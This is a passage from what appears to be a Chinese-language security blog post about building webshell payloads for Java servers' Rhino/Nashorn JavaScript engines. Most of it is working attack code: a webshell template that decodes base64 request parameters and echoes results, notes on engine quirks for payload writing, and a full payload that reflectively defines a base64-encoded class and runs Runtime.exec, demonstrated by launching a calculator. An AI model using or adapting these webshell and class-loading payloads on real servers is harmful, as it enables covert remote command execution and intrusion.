+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//导入基础拓展
+</span></span><span class="line"><span class="cl">try {
+</span></span><span class="line"><span class="cl">  load(&#34;nashorn:mozilla_compat.js&#34;);
+</span></span><span class="line"><span class="cl">} catch (e) {}
+</span></span><span class="line"><span class="cl">//导入常见包
+</span></span><span class="line"><span class="cl">importPackage(Packages.java.util);
+</span></span><span class="line"><span class="cl">importPackage(Packages.java.lang);
+</span></span><span class="line"><span class="cl">importPackage(Packages.java.io);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">var output = new StringBuffer(&#34;&#34;); //输出
+</span></span><span class="line"><span class="cl">var cs = &#34;${jspencode}&#34;; //设置字符集编码
+</span></span><span class="line"><span class="cl">var tag_s = &#34;${tag_s}&#34;; //开始符号
+</span></span><span class="line"><span class="cl">var tag_e = &#34;${tag_e}&#34;; //结束符号
+</span></span><span class="line"><span class="cl">try {
+</span></span><span class="line"><span class="cl">  response.setContentType(&#34;text/html&#34;);
+</span></span><span class="line"><span class="cl">  request.setCharacterEncoding(cs);
+</span></span><span class="line"><span class="cl">  response.setCharacterEncoding(cs);
+</span></span><span class="line"><span class="cl">  function decode(str) {
+</span></span><span class="line"><span class="cl">    //参数解码
+</span></span><span class="line"><span class="cl">    str = str.substr(2);
+</span></span><span class="line"><span class="cl">    var bt = Base64DecodeToByte(str);
+</span></span><span class="line"><span class="cl">    return new java.lang.String(bt, cs);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  function Base64DecodeToByte(str) {
+</span></span><span class="line"><span class="cl">    importPackage(Packages.sun.misc);
+</span></span><span class="line"><span class="cl">    importPackage(Packages.java.util);
+</span></span><span class="line"><span class="cl">    var bt;
+</span></span><span class="line"><span class="cl">    try {
+</span></span><span class="line"><span class="cl">      bt = new BASE64Decoder().decodeBuffer(str);
+</span></span><span class="line"><span class="cl">    } catch (e) {
+</span></span><span class="line"><span class="cl">      bt = Base64.getDecoder().decode(str);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    return bt;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  function asoutput(str) {
+</span></span><span class="line"><span class="cl">    //回显加密
+</span></span><span class="line"><span class="cl">    return str;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  function func(z1) {
+</span></span><span class="line"><span class="cl">    //eval function
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    return z1;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  output.append(func(z1)); //添加功能函数回显
+</span></span><span class="line"><span class="cl">} catch (e) {
+</span></span><span class="line"><span class="cl">  output.append(&#34;ERROR:// &#34; + e.toString()); //输出错误
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">try {
+</span></span><span class="line"><span class="cl">  response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e); //回显
+</span></span><span class="line"><span class="cl">} catch (e) {}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="语法问题的坑" class="headerLink">
+    <a href="#%e8%af%ad%e6%b3%95%e9%97%ae%e9%a2%98%e7%9a%84%e5%9d%91" class="header-mark"></a>5 语法问题的坑</h2><h3 id="两种语言对象间的相互转换" class="headerLink">
+    <a href="#%e4%b8%a4%e7%a7%8d%e8%af%ad%e8%a8%80%e5%af%b9%e8%b1%a1%e9%97%b4%e7%9a%84%e7%9b%b8%e4%ba%92%e8%bd%ac%e6%8d%a2" class="header-mark"></a>5.1 两种语言对象间的相互转换</h3><p>要注意的是，在遇到Java跟JS可能存在类型冲突的地方，即使导入了包也要加上全限定类名。</p>
+<p>在编写payload的时候被坑了很久的一个问题就是，在导入java.lang以后写new String(bt,cs)没有加全限定类名，导致打印出来的一直是一个字符串地址。</p>
+<p>正确的操作是new java.lang.String(bt,cs)。因为在Java和Js中均存在String类，按照优先级，直接new出来的会是Js的对象。</p>
+<p>下面附上类型对比表：</p>
+<table>
+<thead>
+<tr>
+<th>JavaScript Value</th>
+<th>JavaScript Type</th>
+<th>Java Type</th>
+<th>Is Scriptable</th>
+<th>Is Function</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>{a:1, b:[&lsquo;x&rsquo;,&lsquo;y&rsquo;]}</td>
+<td>object</td>
+<td>org.mozilla.javascript.NativeObject</td>
+<td><strong>+</strong></td>
+<td>-</td>
+</tr>
+<tr>
+<td>[1,2,3]</td>
+<td>object</td>
+<td>org.mozilla.javascript.NativeArray</td>
+<td><strong>+</strong></td>
+<td>-</td>
+</tr>
+<tr>
+<td>1</td>
+<td>number</td>
+<td>java.lang.Double</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>1.2345</td>
+<td>number</td>
+<td>java.lang.Double</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>NaN</td>
+<td>number</td>
+<td>java.lang.Double</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>Infinity</td>
+<td>number</td>
+<td>java.lang.Double</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-Infinity</td>
+<td>number</td>
+<td>java.lang.Double</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>true</td>
+<td>boolean</td>
+<td>java.lang.Boolean</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>&ldquo;test&rdquo;</td>
+<td>string</td>
+<td>java.lang.String</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>null</td>
+<td>object</td>
+<td>null</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>undefined</td>
+<td>undefined</td>
+<td>org.mozilla.javascript.Undefined</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>function () { }</td>
+<td>function</td>
+<td>org.mozilla.javascript.gen.c1</td>
+<td><strong>+</strong></td>
+<td><strong>+</strong></td>
+</tr>
+<tr>
+<td>/.*/</td>
+<td>object</td>
+<td>org.mozilla.javascript.regexp.NativeRegExp</td>
+<td><strong>+</strong></td>
+<td><strong>+</strong></td>
+</tr>
+</tbody>
+</table>
+<h3 id="rhinonashorn解析的差异" class="headerLink">
+    <a href="#rhinonashorn%e8%a7%a3%e6%9e%90%e7%9a%84%e5%b7%ae%e5%bc%82" class="header-mark"></a>5.2 Rhino/Nashorn解析的差异</h3><p>这也是当时一个坑点，看下面一段代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">      var readonlyenv = System.getenv();
+</span></span><span class="line"><span class="cl">      var cmdenv = new java.util.HashMap(readonlyenv);
+</span></span><span class="line"><span class="cl">      var envs = envstr.split(&#34;\\|\\|\\|asline\\|\\|\\|&#34;);
+</span></span><span class="line"><span class="cl">      for (var i = 0; i &lt; envs.length; i++) {
+</span></span><span class="line"><span class="cl">        var es = envs[i].split(&#34;\\|\\|\\|askey\\|\\|\\|&#34;);
+</span></span><span class="line"><span class="cl">        if (es.length == 2) {
+</span></span><span class="line"><span class="cl">          cmdenv.put(es[0], es[1]);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">      }
+</span></span><span class="line"><span class="cl">      var e = [];
+</span></span><span class="line"><span class="cl">      var i = 0;
+</span></span><span class="line"><span class="cl">      print(cmdenv+&#39;\n&#39;);
+</span></span><span class="line"><span class="cl">      for (var key in cmdenv) {//关键
+</span></span><span class="line"><span class="cl">        print(&#34;key: &#34;+key+&#34;\n&#34;);
+</span></span><span class="line"><span class="cl">        e[i] = key + &#34;=&#34; + cmdenv[key];
+</span></span><span class="line"><span class="cl">        i++;
+</span></span><span class="line"><span class="cl">      }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中cmdenv是个HashMap，这段代码在Java 8中Nashorn引擎可以正常解析，var key in cmdenv的时候把cmdenv的键给输出了</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074110621-4ecd43d6-0013-4f1a-83a3-4a0075ba6930.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074110621-4ecd43d6-0013-4f1a-83a3-4a0075ba6930.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074110621-4ecd43d6-0013-4f1a-83a3-4a0075ba6930.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074110621-4ecd43d6-0013-4f1a-83a3-4a0075ba6930.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074110621-4ecd43d6-0013-4f1a-83a3-4a0075ba6930.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074110621-4ecd43d6-0013-4f1a-83a3-4a0075ba6930.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>但是在Java 6下运行时，Rhino把他当成了一个js对象，把其属性输出了</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074128796-2e85593d-37b7-4822-82fb-5ebbebb79edd.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074128796-2e85593d-37b7-4822-82fb-5ebbebb79edd.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074128796-2e85593d-37b7-4822-82fb-5ebbebb79edd.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074128796-2e85593d-37b7-4822-82fb-5ebbebb79edd.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074128796-2e85593d-37b7-4822-82fb-5ebbebb79edd.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074128796-2e85593d-37b7-4822-82fb-5ebbebb79edd.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>所以涉及到这种混合写法就会有异议，不同的引擎有不同的解释。</p>
+<p>解决办法使用Java迭代器即可，不掺杂js的写法。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    var i = 0;
+</span></span><span class="line"><span class="cl">    var iter = cmdenv.keySet().iterator();
+</span></span><span class="line"><span class="cl">    while (iter.hasNext()) {
+</span></span><span class="line"><span class="cl">      var key = iter.next();
+</span></span><span class="line"><span class="cl">      var val = cmdenv.get(key);
+</span></span><span class="line"><span class="cl">      //print(&#34;\nkey:&#34; + key);
+</span></span><span class="line"><span class="cl">      //print(&#34;\nval:&#34; + val);
+</span></span><span class="line"><span class="cl">      e[i] = key + &#34;=&#34; + val;
+</span></span><span class="line"><span class="cl">      i++;
+</span></span><span class="line"><span class="cl">    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="反射的坑" class="headerLink">
+    <a href="#%e5%8f%8d%e5%b0%84%e7%9a%84%e5%9d%91" class="header-mark"></a>5.3 反射的坑</h3><p>在Java中，如果涉及到不同版本之间类的包名不一样，我们通常不能直接导入，而要使用反射的写法。</p>
+<p>例如base64解码的时候，Java的写法如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    public byte[] Base64DecodeToByte(String str) {
+</span></span><span class="line"><span class="cl">        byte[] bt = null;
+</span></span><span class="line"><span class="cl">        String version = System.getProperty(&#34;java.version&#34;);
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            if (version.compareTo(&#34;1.9&#34;) &gt;= 0) {
+</span></span><span class="line"><span class="cl">                Class clazz = Class.forName(&#34;java.util.Base64&#34;);
+</span></span><span class="line"><span class="cl">                Object decoder = clazz.getMethod(&#34;getDecoder&#34;).invoke(null);
+</span></span><span class="line"><span class="cl">                bt = (byte[]) decoder.getClass().getMethod(&#34;decode&#34;, String.class).invoke(decoder, str);
+</span></span><span class="line"><span class="cl">            } else {
+</span></span><span class="line"><span class="cl">                Class clazz = Class.forName(&#34;sun.misc.BASE64Decoder&#34;);
+</span></span><span class="line"><span class="cl">                bt = (byte[]) clazz.getMethod(&#34;decodeBuffer&#34;, String.class).invoke(clazz.newInstance(), str);
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">            return bt;
+</span></span><span class="line"><span class="cl">        } catch (Exception e) {
+</span></span><span class="line"><span class="cl">            return new byte[]{};
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>改写成js风格后，发现会有一些奇奇怪怪的BUG。（后来发现反射其实也可以实现，导入Java类型然后再传入反射参数即可，就是比较麻烦）</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623112217854-f668143f-792b-4b56-9bd2-9414a210cbbf.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623112217854-f668143f-792b-4b56-9bd2-9414a210cbbf.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623112217854-f668143f-792b-4b56-9bd2-9414a210cbbf.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623112217854-f668143f-792b-4b56-9bd2-9414a210cbbf.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623112217854-f668143f-792b-4b56-9bd2-9414a210cbbf.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623112217854-f668143f-792b-4b56-9bd2-9414a210cbbf.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function test(str) {
+</span></span><span class="line"><span class="cl">  var bt = null;
+</span></span><span class="line"><span class="cl">  var version = System.getProperty(&#34;java.version&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  if (version.compareTo(&#34;1.9&#34;) &gt;= 0) {
+</span></span><span class="line"><span class="cl">    var clazz = java.lang.Class.forName(&#34;java.util.Base64&#34;);
+</span></span><span class="line"><span class="cl">    var decoder = clazz.getMethod(&#34;getDecoder&#34;).invoke(null);
+</span></span><span class="line"><span class="cl">    bt = decoder
+</span></span><span class="line"><span class="cl">      .getClass()
+</span></span><span class="line"><span class="cl">      .getMethod(&#34;decode&#34;, java.lang.String.class)
+</span></span><span class="line"><span class="cl">      .invoke(decoder, str);
+</span></span><span class="line"><span class="cl">  } else {
+</span></span><span class="line"><span class="cl">    var clazz = java.lang.Class.forName(&#34;sun.misc.BASE64Decoder&#34;);
+</span></span><span class="line"><span class="cl">    bt = clazz
+</span></span><span class="line"><span class="cl">      .getMethod(&#34;decodeBuffer&#34;, java.lang.String.class)
+</span></span><span class="line"><span class="cl">      .invoke(clazz.newInstance(), str);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  return bt;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是在Js中，我们并不需要这么麻烦。上面提到过如果importPackage了一个不存在的包名，Js引擎会将这个错误给忽略，并且由于Js松散的语言特性，我们仅仅需要正射+异常捕获就可以完成目的。大大减小了payload编写的复杂度。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  function Base64DecodeToByte(str) {
+</span></span><span class="line"><span class="cl">    importPackage(Packages.sun.misc);
+</span></span><span class="line"><span class="cl">    importPackage(Packages.java.util);
+</span></span><span class="line"><span class="cl">    var bt;
+</span></span><span class="line"><span class="cl">    try {
+</span></span><span class="line"><span class="cl">      bt = new BASE64Decoder().decodeBuffer(str);
+</span></span><span class="line"><span class="cl">    } catch (e) {
+</span></span><span class="line"><span class="cl">      bt = Base64.getDecoder().decode(str);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    return bt;
+</span></span><span class="line"><span class="cl">  }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="保底操作" class="headerLink">
+    <a href="#%e4%bf%9d%e5%ba%95%e6%93%8d%e4%bd%9c" class="header-mark"></a>6 保底操作</h2><p>理论上，我们可以用js引擎的一句话实现所有字节码一句话的功能，退一万步讲，如果有些功能实在不好实现，或者说想套用现有的payload应该怎么办呢。</p>
+<p>我们可以用java调用js后，再调用defineClass来实现：</p>
+<p>编写一个命令执行的类：calc.java</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import java.io.IOException;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">public class calc {
+</span></span><span class="line"><span class="cl">    public calc(String cmd){
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            Runtime.getRuntime().exec(cmd);
+</span></span><span class="line"><span class="cl">        } catch (IOException e) {
+</span></span><span class="line"><span class="cl">            e.printStackTrace();
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>编译之后base64一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt; base64 -w 0 calc.class
+</span></span><span class="line"><span class="cl">yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIA
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>填入下方payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">try {
+</span></span><span class="line"><span class="cl">  load(&#34;nashorn:mozilla_compat.js&#34;);
+</span></span><span class="line"><span class="cl">} catch (e) {}
+</span></span><span class="line"><span class="cl">importPackage(Packages.java.util);
+</span></span><span class="line"><span class="cl">importPackage(Packages.java.lang);
+</span></span><span class="line"><span class="cl">importPackage(Packages.java.io);
+</span></span><span class="line"><span class="cl">var output = new StringBuffer(&#34;&#34;);
+</span></span><span class="line"><span class="cl">var cs = &#34;UTF-8&#34;;
+</span></span><span class="line"><span class="cl">response.setContentType(&#34;text/html&#34;);
+</span></span><span class="line"><span class="cl">request.setCharacterEncoding(cs);
+</span></span><span class="line"><span class="cl">response.setCharacterEncoding(cs);
+</span></span><span class="line"><span class="cl">function Base64DecodeToByte(str) {
+</span></span><span class="line"><span class="cl">  importPackage(Packages.sun.misc);
+</span></span><span class="line"><span class="cl">  importPackage(Packages.java.util);
+</span></span><span class="line"><span class="cl">  var bt;
+</span></span><span class="line"><span class="cl">  try {
+</span></span><span class="line"><span class="cl">    bt = new BASE64Decoder().decodeBuffer(str);
+</span></span><span class="line"><span class="cl">  } catch (e) {
+</span></span><span class="line"><span class="cl">    bt = new Base64().getDecoder().decode(str);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  return bt;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">function define(Classdata, cmd) {
+</span></span><span class="line"><span class="cl">  var classBytes = Base64DecodeToByte(Classdata);
+</span></span><span class="line"><span class="cl">  var byteArray = Java.type(&#34;byte[]&#34;);
+</span></span><span class="line"><span class="cl">  var int = Java.type(&#34;int&#34;);
+</span></span><span class="line"><span class="cl">  var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(
+</span></span><span class="line"><span class="cl">    &#34;defineClass&#34;,
+</span></span><span class="line"><span class="cl">    byteArray.class,
+</span></span><span class="line"><span class="cl">    int.class,
+</span></span><span class="line"><span class="cl">    int.class
+</span></span><span class="line"><span class="cl">  );
+</span></span><span class="line"><span class="cl">  defineClassMethod.setAccessible(true);
+</span></span><span class="line"><span class="cl">  var cc = defineClassMethod.invoke(
+</span></span><span class="line"><span class="cl">    Thread.currentThread().getContextClassLoader(),
+</span></span><span class="line"><span class="cl">    classBytes,
+</span></span><span class="line"><span class="cl">    0,
+</span></span><span class="line"><span class="cl">    classBytes.length
+</span></span><span class="line"><span class="cl">  );
+</span></span><span class="line"><span class="cl">  return cc.getConstructor(java.lang.String.class).newInstance(cmd);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">output.append(
+</span></span><span class="line"><span class="cl">  define(
+</span></span><span class="line"><span class="cl">    &#34;yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==&#34;,
+</span></span><span class="line"><span class="cl">    &#34;calc&#34;
+</span></span><span class="line"><span class="cl">  )
+</span></span><span class="line"><span class="cl">);
+</span></span><span class="line"><span class="cl">response.getWriter().print(output);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功弹出计算器</p>
